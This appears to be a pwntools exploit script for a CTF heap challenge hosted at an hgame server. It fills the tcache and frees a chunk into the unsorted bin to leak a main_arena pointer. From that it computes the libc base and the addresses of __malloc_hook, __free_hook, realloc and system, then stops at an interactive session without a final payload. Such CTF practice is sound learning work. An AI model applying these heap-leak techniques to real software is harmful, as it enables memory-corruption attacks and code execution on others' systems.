from pwn import *
import time

context.log_level = 'debug'

debug = True

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 32461)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP('./libc.so.6')


def add(idx, size, content):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Content: ", content)


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def show(idx):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))


for i in range(7):
    add(i, 0x80, "abc")

add(7, 0x80, "abc")

for i in range(7):
    delete(i)

add(8, 0x10, "")
delete(7)
add(9, 0x40, "")
show(9)

ddebug()
libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))

main_arena_offset = 0x7f0aea54abe0 - 0x7f0aea35e000
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
_free_hook_address = libc.symbols["__free_hook"]
success("free_hook -> " + hex(_free_hook_address))
realloc_address = libc.sym['realloc']
success("realloc_address -> " + hex(realloc_address))
success("system -> " + hex(libc.symbols["system"]))

io.interactive()
